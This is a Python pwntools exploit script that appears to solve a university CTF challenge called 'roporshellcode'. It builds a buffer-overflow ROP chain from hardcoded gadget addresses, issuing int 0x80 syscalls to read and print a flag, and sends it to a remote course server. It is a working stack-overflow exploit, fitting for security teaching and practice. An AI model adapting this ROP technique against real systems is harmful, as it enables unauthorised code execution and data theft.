#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './roporshellcode' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 28180 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
    libc = ELF('./libc-2.23.so')
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
offset = cyclic_find(0x61616164)
pop_ebx = p32(0x08049022)
mov_eax_0_leave = p32(0x08049275)
eax_ecx = p32(0x080491c4)
ebx_edx = p32(0x080491cd)
eax_edx__ebx_edx = p32(0x080491cb)
inc_edx = p32(0x080491d0)
ebp_esp = p32(0x080491b7)
ecx_esp = p32(0x080491ff)
sub_ecx_4 = p32(0x080491c0)
xor_edx = p32(0x080491ba)
int_0x80 = p32(0x080491bd)

writable_region = p32(0x80491a9) #p32(0x8048388)  

p.recvuntil(b'fd: ', drop=True)
fd = p.recvline()
log.info(f"flag at fd: {int(fd)}")
p.recvline()

chain = (
    xor_edx
    + inc_edx*3
    + eax_edx__ebx_edx
    + ebp_esp
    + ecx_esp
    + inc_edx*97
    + int_0x80

    + xor_edx
    + inc_edx*4
    + eax_edx__ebx_edx
    + pop_ebx
    + p32(1)
    + inc_edx*96
    + int_0x80

    + xor_edx
    + inc_edx
    + int_0x80
)

payload = fit ({
    offset-4: writable_region,
    offset: chain
})

p.sendline(payload)
p.interactive()

